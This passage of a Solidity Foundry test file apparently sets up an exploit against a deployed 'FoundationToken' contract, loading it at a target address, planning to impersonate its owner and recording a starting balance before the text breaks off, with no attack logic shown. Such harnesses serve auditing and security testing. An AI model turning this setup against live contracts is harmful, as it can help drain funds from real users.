    FoundationToken_Comprehensive_Smart_Contract_Audit foundation;
    address owner;

    // --- Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the deployed contract at TARGET
        foundation = FoundationToken_Comprehensive_Smart_Contract_Audit(TARGET);
        // Label for debugging
        vm.label(TARGET, "FoundationToken");
        // Get the owner address - we'll need to impersonate them
        owner = foundation.owner();
        vm.label(owner, "Original Owner");
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = address(this).balance;

        // Get current owner
